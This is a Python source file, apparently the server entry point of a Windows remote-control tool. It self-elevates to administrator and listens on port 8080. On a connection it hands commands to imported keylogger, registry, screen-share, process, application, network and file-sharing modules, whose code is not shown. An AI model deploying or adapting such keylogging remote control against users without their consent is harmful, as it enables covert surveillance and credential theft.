from ServerSocket import ServerSocket
from KeyLogger import KeyLogger
from Window import OS
from Registry import Registry
from Screen import Screen
from Process import Process
from Application import Application
from Network import Network
from SysTrayIcon import SysTrayIcon
from ShareFile import ShareFile
from ServerIO import ServerIO
from ctypes import windll
import threading
import itertools
import glob
import sys
import socket
import os
import signal
import time

HOST = ""
PORT = 8080
ADDR = (HOST, PORT)


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(os.path.realpath(__file__))

    return os.path.join(base_path, relative_path)


class ServerApp:
    def __init__(self):
        if  self.is_admin():
            self.setup()

        else:
            windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )

    def is_admin(self):
        try:
            return windll.shell32.IsUserAnAdmin()
        except:
            return False

    def setup(self):
        self.running = True
        icons = itertools.cycle(
            glob.glob(resource_path("*.ico"))
        )
        SysTrayIcon(
            next(icons),
            "Waiting for connection...",
            (),
            on_start=self.open_server,
            on_quit=self.quit,
            default_menu_index=1,
        )

    def open_server(self, sysTrayIcon):
        self.server = ServerSocket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(ADDR)
        self.server.listen(1)

        self.server_io = ServerIO()
        self.key_logger = KeyLogger(self.server)
        self.os = OS()
        self.registry = Registry(self.server)
        self.screen = Screen(self.server)
        self.process = Process(self.server)
        self.application = Application(self.server)
        self.network = Network(self.server)
        self.share_file = ShareFile(self.server)

        self.start_listening(sysTrayIcon)

    def start_listening(self, sysTrayIcon):
        while self.running:
            threading.Thread(target=self.server_io.start_listening, daemon=True).start()
            addr = self.server.accept()
            sysTrayIcon.hover_text = "Connected by " + addr
            sysTrayIcon.refresh_icon()

            self.screen.setup_screen_share()

            listeners = [
                self.share_file.start_listening,  # DONE
                self.key_logger.start_listening,  # DONE
                self.os.start_listening,  # DONE
                self.registry.start_listening,  # DONE
                self.screen.start_listening,  # DONE
                self.process.start_listening,  # DONE
                self.application.start_listening,  # DONE
                self.network.start_listening,  # DONE
            ]

            while True:
                print("MENU:")
                s = self.server.receive_obj()

                print(s)
                if s == "QUIT":
                    break

                for listener in listeners:
                    if listener(s):
                        break

            if self.running:
                sysTrayIcon.hover_text = "Waiting for connection..."
                sysTrayIcon.refresh_icon()

                self.screen.close_screen_share()
                self.server_io.stop()
                self.key_logger.stop()

    def quit(self, SysTrayIcon):
        try:
            self.running = False
            self.screen.close_screen_share()
            self.key_logger.stop()
            self.server_io.close()
            self.server.close()
        except:
            pass

if __name__ == "__main__":
    ServerApp()

    for i in range(5):
        time.sleep(1)
        if len(threading.enumerate()) == 1:
            break
    os.kill(os.getpid(), signal.SIGINT)